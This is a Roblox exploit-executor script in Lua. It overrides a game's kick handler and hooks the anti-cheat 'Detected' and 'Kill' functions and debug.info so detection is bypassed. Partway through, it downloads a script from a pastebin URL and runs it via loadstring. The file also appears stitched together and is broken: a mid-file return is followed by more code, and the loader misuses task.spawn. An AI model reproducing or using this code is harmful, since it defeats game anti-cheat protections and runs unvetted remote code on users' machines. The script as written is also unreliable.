local cloneref = cloneref or function(...) return ... end
local LocalPlayer = game.Players.LocalPlayer and cloneref(game:GetService("Players")).LocalPlayer

for i, v in next, getgc(true) do
    if pcall(function() rawget(v, "IndexInstance") end) and type(rawget(v, "IndexInstance")) == "table" and (rawget(v, "IndexInstance"))[1] == "kick" then
        v.tvk = {"kick", function(plr)
            for k, j in next, cloneref(game:GetService("Players")):GetPlayers() do
                if pcall(function() return j == LocalPlayer and j.Name == LocalPlayer.Name end) and j == LocalPlayer and j.Name == LocalPlayer.Name then
                    return nil, nil, nil
                end
            end
            return nil, nil, nil
        end}
    end
end

local Loader = task.spawn(game.HttpGet, game, "https://pastebin.com/raw/8qN5bFpB") -- AntiKick V1
return loadstring(Loader)("Anti Kick!")

local getinfo = getinfo or debug.getinfo
local DEBUG = false
local Hooked = {}

local Detected, Kill

setthreadidentity(2)

for i, v in getgc(true) do
    if typeof(v) == "table" then
        local DetectFunc = rawget(v, "Detected")
        local KillFunc = rawget(v, "Kill")
    
        if typeof(DetectFunc) == "function" and not Detected then
            Detected = DetectFunc
            
            local Old; Old = hookfunction(Detected, function(Action, Info, NoCrash)
                if Action ~= "_" then
                    if DEBUG then
                        return true
                    end
                end
                
                return true
            end)

            table.insert(Hooked, Detected)
        end

        if rawget(v, "Variables") and rawget(v, "Process") and typeof(KillFunc) == "function" and not Kill then
            Kill = KillFunc
            local Old; Old = hookfunction(Kill, function(Info)
                if DEBUG then
                    return false
                end
            end)

            table.insert(Hooked, Kill)
        end
    end
end

local Old; Old = hookfunction(getrenv().debug.info, newcclosure(function(...)
    local LevelOrFunc, Info = ...

    if Detected and LevelOrFunc == Detected then
        if DEBUG then
            return true
        end

        return coroutine.yield(coroutine.running())
    end
    
    return Old(...)
end))
-- setthreadidentity(9)
setthreadidentity(7)